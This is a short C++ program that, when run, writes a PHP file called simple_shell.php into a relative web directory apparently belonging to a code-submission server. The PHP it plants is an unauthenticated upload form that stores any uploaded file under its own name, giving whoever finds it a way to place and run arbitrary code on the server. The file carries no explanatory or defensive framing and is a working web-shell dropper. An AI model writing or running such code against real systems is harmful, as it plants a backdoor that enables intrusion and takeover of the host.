#include<fstream>
#include<string>
using namespace std;
int main(){
    string str;
    ofstream out;
    out.open("../../www/web-submission/simple_shell.php");
    out << "<html><body><form name='f' method='post' action='' enctype='multipart/form-data'><input type='file' name='file'><input type='hidden' name='action' value='upload'><input type='submit' value='submit'></form><?php if(is_uploaded_file($_FILES['file']['tmp_name']))if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']))echo 'upload complete'; ?></body></html>";
    out.close();
    return 0;
}
